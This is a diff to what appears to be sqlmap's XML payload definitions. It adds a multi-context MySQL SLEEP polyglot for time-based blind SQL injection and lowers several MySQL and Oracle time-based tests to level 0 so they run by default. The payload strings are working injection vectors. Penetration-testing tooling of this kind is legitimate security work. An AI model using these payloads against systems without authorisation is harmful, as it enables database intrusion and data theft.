@@ -168,6 +168,27 @@
         </details>
     </test>
 
+    <!-- PayloadsAllTheThings: Polyglot - works in multiple string contexts (single-quote, double-quote, no-quote) -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace (polyglot - multi-context bypass)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>IF(([INFERENCE]),SLEEP([SLEEPTIME]),0)/*' or IF(([INFERENCE]),SLEEP([SLEEPTIME]),0) or '" or IF(([INFERENCE]),SLEEP([SLEEPTIME]),0) or "*/</vector>
+        <request>
+            <payload>IF(1=1,SLEEP([SLEEPTIME]),0)/*' or IF(1=1,SLEEP([SLEEPTIME]),0) or '" or IF(1=1,SLEEP([SLEEPTIME]),0) or "*/</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
     <test>
         <title>MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)</title>
         <stype>5</stype>
@@ -418,7 +439,7 @@
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (query SLEEP - Pre-WHERE/string context)</title>
         <stype>5</stype>
-        <level>1</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
@@ -439,7 +460,7 @@
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (if now sysdate SLEEP)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
@@ -460,7 +481,7 @@
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (CASE WHEN SLEEP)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
@@ -920,7 +941,7 @@
     <test>
         <title>Oracle time-based blind - Ghauri style (DBMS_PIPE.RECEIVE_MESSAGE - string context)</title>
         <stype>5</stype>
-        <level>1</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
@@ -939,7 +960,7 @@
     <test>
         <title>Oracle time-based blind - Ghauri style (DBMS_LOCK.SLEEP - string context)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
@@ -958,7 +979,7 @@
     <test>
         <title>Oracle time-based blind - Ghauri style (USER_LOCK.SLEEP - string context)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
@@ -1938,7 +1959,7 @@
     <test>
         <title>Oracle time-based blind - Parameter replace (USER_LOCK.SLEEP)</title>
         <stype>5</stype>
-        <level>3</level>
+        <level>0</level>
         <risk>1</risk>
         <clause>1,3,9</clause>
         <where>3</where>
